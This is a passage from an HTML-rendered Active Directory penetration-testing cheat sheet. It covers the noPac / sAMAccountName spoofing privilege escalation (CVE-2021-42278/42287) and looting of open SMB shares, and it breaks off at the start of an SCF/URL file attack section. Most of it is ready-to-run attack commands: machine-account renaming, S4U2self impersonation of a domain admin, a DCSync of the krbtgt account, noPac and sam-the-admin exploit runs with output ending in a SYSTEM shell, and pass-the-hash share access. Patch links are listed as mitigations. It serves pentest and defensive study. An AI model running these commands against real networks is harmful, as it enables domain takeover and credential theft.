<a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="n">powermad</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="nb">Set-MachineAccountAttribute</span> <span class="n">-MachineAccount</span> <span class="s2">&quot;ControlledComputer&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;DomainController&quot;</span> <span class="n">-Attribute</span> <span class="n">samaccountname</span> <span class="n">-Verbose</span>
</code></pre></div></li>
<li>Request a TGT for the controlled machine account
    <div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="n">impacket</span><span class="nv">@linux</span><span class="p">&gt;</span> <span class="n">getTGT</span><span class="p">.</span><span class="n">py</span> <span class="n">-dc-ip</span> <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;DomainController&#39;</span><span class="p">:</span><span class="s1">&#39;ComputerPassword&#39;</span>
<a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>
<a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="n">cmd</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s2">&quot;DomainController&quot;</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s2">&quot;ComputerPassword&quot;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="s2">&quot;domain.local&quot;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="s2">&quot;DomainController.domain.local&quot;</span> <span class="p">/</span><span class="n">nowrap</span>
</code></pre></div></li>
<li>Reset the controlled machine account sAMAccountName to its old value 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="n">impacket</span><span class="nv">@linux</span><span class="p">&gt;</span> <span class="n">renameMachine</span><span class="p">.</span><span class="n">py</span> <span class="n">-current-name</span> <span class="s1">&#39;DomainController&#39;</span> <span class="n">-new-name</span> <span class="s1">&#39;ControlledComputer$&#39;</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="s1">&#39;password&#39;</span>
<a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>
<a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a><span class="n">powermad</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="nb">Set-MachineAccountAttribute</span> <span class="n">-MachineAccount</span> <span class="s2">&quot;ControlledComputer&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;ControlledComputer&quot;</span> <span class="n">-Attribute</span> <span class="n">samaccountname</span> <span class="n">-Verbose</span>
</code></pre></div></li>
<li>(CVE-2021-42287) Request a service ticket with <code>S4U2self</code> by presenting the TGT obtained before
    <div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c"># https://github.com/SecureAuthCorp/impacket/pull/1202</span>
<a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="n">impacket</span><span class="nv">@linux</span><span class="p">&gt;</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="s1">&#39;DomainController.ccache&#39;</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-self</span> <span class="n">-impersonate</span> <span class="s1">&#39;DomainAdmin&#39;</span> <span class="n">-spn</span> <span class="s1">&#39;cifs/DomainController.domain.local&#39;</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;DomainController&#39;</span>
<a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>
<a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="n">cmd</span><span class="nv">@windows</span><span class="p">&gt;</span> <span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">self</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="s2">&quot;DomainAdmin&quot;</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="s2">&quot;ldap/DomainController.domain.local&quot;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="s2">&quot;DomainController.domain.local&quot;</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="no">[Base64 TGT]</span>
</code></pre></div></li>
<li>DCSync: <code>KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'</code></li>
</ol>
<p>Automated exploitation:</p>
<ul>
<li><a href="https://github.com/cube0x0/noPac">cube0x0/noPac</a> - Windows
    <div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="n">noPac</span><span class="p">.</span><span class="n">exe</span> <span class="n">scan</span> <span class="n">-domain</span> <span class="n">htb</span><span class="p">.</span><span class="n">local</span> <span class="n">-user</span> <span class="n">user</span> <span class="n">-pass</span> <span class="s1">&#39;password123&#39;</span>
<a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="n">noPac</span><span class="p">.</span><span class="n">exe</span> <span class="n">-domain</span> <span class="n">htb</span><span class="p">.</span><span class="n">local</span> <span class="n">-user</span> <span class="n">domain_user</span> <span class="n">-pass</span> <span class="s1">&#39;Password123!&#39;</span> <span class="p">/</span><span class="n">dc</span> <span class="n">dc</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">mAccount</span> <span class="n">demo123</span> <span class="p">/</span><span class="n">mPassword</span> <span class="n">Password123</span><span class="p">!</span> <span class="p">/</span><span class="n">service</span> <span class="n">cifs</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a><span class="n">noPac</span><span class="p">.</span><span class="n">exe</span> <span class="n">-domain</span> <span class="n">htb</span><span class="p">.</span><span class="n">local</span> <span class="n">-user</span> <span class="n">domain_user</span> <span class="n">-pass</span> <span class="s2">&quot;Password123!&quot;</span> <span class="p">/</span><span class="n">dc</span> <span class="n">dc</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">mAccount</span> <span class="n">demo123</span> <span class="p">/</span><span class="n">mPassword</span> <span class="n">Password123</span><span class="p">!</span> <span class="p">/</span><span class="n">service</span> <span class="n">ldaps</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">impersonate</span> <span class="n">Administrator</span>
</code></pre></div></li>
<li><a href="https://github.com/Ridter/noPac">Ridter/noPac</a> - Linux
  <div class="highlight"><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="n">python</span> <span class="n">noPac</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;domain.local/user&#39;</span> <span class="n">-hashes</span> <span class="s1">&#39;:31d6cfe0d16ae931b73c59d7e0c089c0&#39;</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-use-ldap</span> <span class="n">-dump</span>
</code></pre></div></li>
<li><a href="https://github.com/WazeHell/sam-the-admin">WazeHell/sam-the-admin</a>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">sam_the_admin</span><span class="p">.</span><span class="n">py</span> <span class="s2">&quot;domain/user:password&quot;</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-shell</span>
<a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="p">[*]</span> <span class="n">Selected</span> <span class="n">Target</span> <span class="n">dc</span><span class="p">.</span><span class="n">caltech</span><span class="p">.</span><span class="n">white</span>                                              
<a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="p">[*]</span> <span class="n">Total</span> <span class="n">Domain</span> <span class="n">Admins</span> <span class="n">11</span>                                                        
<a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="p">[*]</span> <span class="n">will</span> <span class="k">try</span> <span class="n">to</span> <span class="n">impersonat</span> <span class="n">gaylene</span><span class="p">.</span><span class="n">dreddy</span>                                         
<a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="p">[*]</span> <span class="n">Current</span> <span class="n">ms-DS-MachineAccountQuota</span> <span class="p">=</span> <span class="n">10</span>                                        
<a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a><span class="p">[*]</span> <span class="n">Adding</span> <span class="n">Computer</span> <span class="n">Account</span> <span class="s2">&quot;SAMTHEADMIN-11$&quot;</span>                                     
<a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a><span class="p">[*]</span> <span class="n">MachineAccount</span> <span class="s2">&quot;SAMTHEADMIN-11$&quot;</span> <span class="n">password</span> <span class="p">=</span> <span class="n">EhFMT</span><span class="k">%</span><span class="n">mzmACL</span>                      
<a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="p">[*]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">SAMTHEADMIN</span><span class="p">-</span><span class="n">11</span><span class="p">$</span> <span class="n">with</span> <span class="n">password</span> <span class="n">EhFMT</span><span class="k">%</span><span class="n">mzmACL</span><span class="p">.</span>
<a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="p">[*]</span> <span class="n">SAMTHEADMIN</span><span class="p">-</span><span class="n">11</span><span class="p">$</span> <span class="n">object</span> <span class="p">=</span> <span class="n">CN</span><span class="p">=</span><span class="n">SAMTHEADMIN</span><span class="p">-</span><span class="n">11</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">caltech</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">white</span>   
<a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a><span class="p">[*]</span> <span class="n">SAMTHEADMIN</span><span class="p">-</span><span class="n">11</span><span class="p">$</span> <span class="n">sAMAccountName</span> <span class="p">==</span> <span class="n">dc</span>                                          
<a id="__codelineno-67-11" name="__codelineno-67-11" href="#__codelineno-67-11"></a><span class="p">[*]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="k">in</span> <span class="n">dc</span><span class="p">.</span><span class="n">ccache</span>                                                    
<a id="__codelineno-67-12" name="__codelineno-67-12" href="#__codelineno-67-12"></a><span class="p">[*]</span> <span class="n">Resting</span> <span class="n">the</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">to</span> <span class="n">SAMTHEADMIN</span><span class="p">-</span><span class="n">11</span><span class="p">$</span>                                
<a id="__codelineno-67-13" name="__codelineno-67-13" href="#__codelineno-67-13"></a><span class="p">[*]</span> <span class="n">Restored</span> <span class="n">SAMTHEADMIN</span><span class="p">-</span><span class="n">11</span><span class="p">$</span> <span class="n">sAMAccountName</span> <span class="n">to</span> <span class="n">original</span> <span class="n">value</span>                     
<a id="__codelineno-67-14" name="__codelineno-67-14" href="#__codelineno-67-14"></a><span class="p">[*]</span> <span class="n">Using</span> <span class="n">TGT</span> <span class="n">from</span> <span class="n">cache</span>                                                          
<a id="__codelineno-67-15" name="__codelineno-67-15" href="#__codelineno-67-15"></a><span class="p">[*]</span> <span class="n">Impersonating</span> <span class="n">gaylene</span><span class="p">.</span><span class="n">dreddy</span>                                                  
<a id="__codelineno-67-16" name="__codelineno-67-16" href="#__codelineno-67-16"></a><span class="p">[*]</span>     <span class="n">Requesting</span> <span class="n">S4U2self</span>                                                       
<a id="__codelineno-67-17" name="__codelineno-67-17" href="#__codelineno-67-17"></a><span class="p">[*]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="k">in</span> <span class="n">gaylene</span><span class="p">.</span><span class="n">dreddy</span><span class="p">.</span><span class="n">ccache</span>                                        
<a id="__codelineno-67-18" name="__codelineno-67-18" href="#__codelineno-67-18"></a><span class="p">[!]</span> <span class="n">Launching</span> <span class="n">semi-interactive</span> <span class="n">shell</span> <span class="p">-</span> <span class="n">Careful</span> <span class="n">what</span> <span class="n">you</span> <span class="n">execute</span>                   
<a id="__codelineno-67-19" name="__codelineno-67-19" href="#__codelineno-67-19"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">whoami</span>                                                        
<a id="__codelineno-67-20" name="__codelineno-67-20" href="#__codelineno-67-20"></a><span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span> 
</code></pre></div></li>
<li><a href="https://github.com/ly4k/Pachine">ly4k/Pachine</a>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="n">usage</span><span class="p">:</span> <span class="n">pachine</span><span class="p">.</span><span class="n">py</span> <span class="p">[</span><span class="n">-h</span><span class="p">]</span> <span class="p">[</span><span class="n">-scan</span><span class="p">]</span> <span class="p">[</span><span class="n">-spn</span> <span class="n">SPN</span><span class="p">]</span> <span class="p">[</span><span class="n">-impersonate</span> <span class="n">IMPERSONATE</span><span class="p">]</span> <span class="p">[</span><span class="n">-domain-netbios</span> <span class="n">NETBIOSNAME</span><span class="p">]</span> <span class="p">[</span><span class="n">-computer-name</span> <span class="nb">NEW-COMPUTER</span><span class="n">-NAME</span><span class="p">$]</span> <span class="p">[</span><span class="n">-computer-pass</span> <span class="n">password</span><span class="p">]</span> <span class="p">[</span><span class="n">-debug</span><span class="p">]</span> <span class="p">[</span><span class="n">-method</span> <span class="p">{</span><span class="n">SAMR</span><span class="p">,</span><span class="n">LDAPS</span><span class="p">}]</span> <span class="p">[</span><span class="n">-port</span> <span class="p">{</span><span class="n">139</span><span class="p">,</span><span class="n">445</span><span class="p">,</span><span class="n">636</span><span class="p">}]</span> <span class="p">[</span><span class="n">-baseDN</span> <span class="n">DC</span><span class="p">=</span><span class="n">test</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="p">]</span>
<a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>              <span class="p">[</span><span class="n">-computer-group</span> <span class="n">CN</span><span class="p">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">test</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="p">]</span> <span class="p">[</span><span class="n">-hashes</span> <span class="n">LMHASH</span><span class="p">:</span><span class="n">NTHASH</span><span class="p">]</span> <span class="p">[</span><span class="n">-no-pass</span><span class="p">]</span> <span class="p">[</span><span class="n">-k</span><span class="p">]</span> <span class="p">[</span><span class="n">-aesKey</span> <span class="n">hex</span> <span class="n">key</span><span class="p">]</span> <span class="n">-dc-host</span> <span class="n">hostname</span> <span class="p">[</span><span class="n">-dc-ip</span> <span class="n">ip</span><span class="p">]</span>
<a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>              <span class="p">[</span><span class="n">domain</span><span class="p">/]</span><span class="n">username</span><span class="p">[:</span><span class="n">password</span><span class="p">]</span>
<a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">pachine</span><span class="p">.</span><span class="n">py</span> <span class="n">-dc-host</span> <span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-scan</span> <span class="s1">&#39;domain.local/john:Passw0rd!&#39;</span>
<a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">pachine</span><span class="p">.</span><span class="n">py</span> <span class="n">-dc-host</span> <span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">administrator</span> <span class="s1">&#39;domain.local/john:Passw0rd!&#39;</span>
<a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a><span class="p">$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="nv">$PWD</span><span class="p">/</span><span class="n">administrator</span><span class="nv">@domain</span><span class="p">.</span><span class="n">local</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a><span class="p">$</span> <span class="n">impacket-psexec</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="s1">&#39;domain.local/administrator@dc.domain.local&#39;</span>
</code></pre></div></li>
</ul>
<p><strong>Mitigations</strong>:
* <a href="https://support.microsoft.com/en-us/topic/november-9-2021-kb5007247-monthly-rollup-2c3b6017-82f4-4102-b1e2-36f366bf3520">KB5007247 - Windows Server 2012 R2</a>
* <a href="https://support.microsoft.com/en-us/topic/november-14-2021-kb5008601-os-build-14393-4771-out-of-band-c8cd33ce-3d40-4853-bee4-a7cc943582b9">KB5008601 - Windows Server 2016</a>
* <a href="https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7">KB5008602 - Windows Server 2019</a>
* <a href="https://support.microsoft.com/en-us/topic/november-9-2021-kb5007205-os-build-20348-350-af102e6f-cc7c-4cd4-8dc2-8b08d73d2b31">KB5007205 - Windows Server 2022</a>
* <a href="https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e">KB5008102</a>
* <a href="https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041">KB5008380</a></p>
<h2 id="open-shares">Open Shares</h2>
<blockquote>
<p>Some shares can be accessible without authentication, explore them to find some juicy files</p>
</blockquote>
<ul>
<li>
<p><a href="https://github.com/ShawnDEvans/smbmap">ShawnDEvans/smbmap - a handy SMB enumeration tool</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="n">smbmap</span> <span class="n">-H</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>                <span class="c"># null session</span>
<a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="n">smbmap</span> <span class="n">-H</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-R</span>             <span class="c"># recursive listing</span>
<a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a><span class="n">smbmap</span> <span class="n">-H</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">invaliduser</span> <span class="c"># guest smb session</span>
<a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="n">smbmap</span> <span class="n">-H</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-d</span> <span class="s2">&quot;DOMAIN.LOCAL&quot;</span> <span class="n">-u</span> <span class="s2">&quot;USERNAME&quot;</span> <span class="n">-p</span> <span class="s2">&quot;Password123*&quot;</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/byt3bl33d3r/pth-toolkit">byt3bl33d3r/pth-smbclient from path-toolkit</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="n">pth-smbclient</span> <span class="n">-U</span> <span class="s2">&quot;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A&quot;</span> <span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">100</span><span class="p">/</span><span class="n">Share</span>
<a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="n">pth-smbclient</span> <span class="n">-U</span> <span class="s2">&quot;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A&quot;</span> <span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">100</span><span class="p">/</span><span class="n">C</span><span class="p">$</span>
<a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="nb">ls </span> <span class="c"># list files</span>
<a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a><span class="nb">cd </span> <span class="c"># move inside a folder</span>
<a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="n">get</span> <span class="c"># download files</span>
<a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a><span class="n">put</span> <span class="c"># replace a file</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket">SecureAuthCorp/smbclient from Impacket</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="n">smbclient</span> <span class="n">-I</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">100</span> <span class="n">-L</span> <span class="n">ACTIVE</span> <span class="n">-N</span> <span class="n">-U</span> <span class="s2">&quot;&quot;</span>
<a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>        <span class="n">Sharename</span>       <span class="nb">Type </span>     <span class="n">Comment</span>
<a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>        <span class="p">---------</span>       <span class="p">----</span>      <span class="p">-------</span>
<a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>        <span class="n">ADMIN</span><span class="p">$</span>          <span class="n">Disk</span>      <span class="n">Remote</span> <span class="n">Admin</span>
<a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>        <span class="n">C</span><span class="p">$</span>              <span class="n">Disk</span>      <span class="k">Default</span> <span class="n">share</span>
<a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>        <span class="n">IPC</span><span class="p">$</span>            <span class="n">IPC</span>       <span class="n">Remote</span> <span class="n">IPC</span>
<a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a>        <span class="n">NETLOGON</span>        <span class="n">Disk</span>      <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span>
<a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a>        <span class="n">Replication</span>     <span class="n">Disk</span>      
<a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>        <span class="n">SYSVOL</span>          <span class="n">Disk</span>      <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span>
<a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a>        <span class="n">Users</span>           <span class="n">Disk</span>
<a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a><span class="n">use</span> <span class="n">Sharename</span> <span class="c"># select a Sharename</span>
<a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a><span class="nb">cd </span><span class="n">Folder</span>     <span class="c"># move inside a folder</span>
<a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a><span class="nb">ls </span>           <span class="c"># list files</span>
</code></pre></div></p>
</li>
<li>
<p><a href="#">smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="n">smbclient</span> <span class="n">-U</span> <span class="n">username</span> <span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">/</span><span class="n">SYSVOL</span>
<a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="n">smbclient</span> <span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">/</span><span class="n">Share</span>
<a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>
<a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="c"># Download a folder recursively</span>
<a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a><span class="n">smb</span><span class="p">:</span> <span class="p">\&gt;</span> <span class="n">mask</span> <span class="s2">&quot;&quot;</span>
<a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="n">smb</span><span class="p">:</span> <span class="p">\&gt;</span> <span class="n">recurse</span> <span class="n">ON</span>
<a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a><span class="n">smb</span><span class="p">:</span> <span class="p">\&gt;</span> <span class="n">prompt</span> <span class="n">OFF</span>
<a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a><span class="n">smb</span><span class="p">:</span> <span class="p">\&gt;</span> <span class="n">lcd</span> <span class="s1">&#39;/path/to/go/&#39;</span>
<a id="__codelineno-72-9" name="__codelineno-72-9" href="#__codelineno-72-9"></a><span class="n">smb</span><span class="p">:</span> <span class="p">\&gt;</span> <span class="n">mget</span> <span class="p">*</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/SnaffCon/Snaffler">SnaffCon/Snaffler - a tool for pentesters to help find delicious candy</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="n">snaffler</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="p">-</span> <span class="n">snaffler</span><span class="p">.</span><span class="n">log</span>
<a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>
<a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a><span class="c"># Snaffle all the computers in the domain</span>
<a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a><span class="p">./</span><span class="n">Snaffler</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="n">-s</span>
<a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>
<a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a><span class="c"># Snaffle specific computers</span>
<a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a><span class="p">./</span><span class="n">Snaffler</span><span class="p">.</span><span class="n">exe</span> <span class="n">-n</span> <span class="n">computer1</span><span class="p">,</span><span class="n">computer2</span> <span class="n">-s</span>
<a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a><span class="err">​</span>
<a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a><span class="c"># Snaffle a specific directory</span>
<a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a><span class="p">./</span><span class="n">Snaffler</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-s</span>
</code></pre></div></p>
</li>
</ul>
<h2 id="scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</h2>
<p>Theses attacks can be automated with <a href="https://github.com/mdsecactivebreach/Farmer">Farmer.exe</a> and <a href="https://github.com/mdsecactivebreach/Farmer/tree/main/crop">Crop.exe</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="c"># Farmer to receive auth</span>
<a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a><span class="n">farmer</span><span class="p">.</span><span class="n">exe</span> <span class="p">&lt;</span><span class="n">port</span><span class="p">&gt;</span> <span class="no">[seconds] [output]</span>
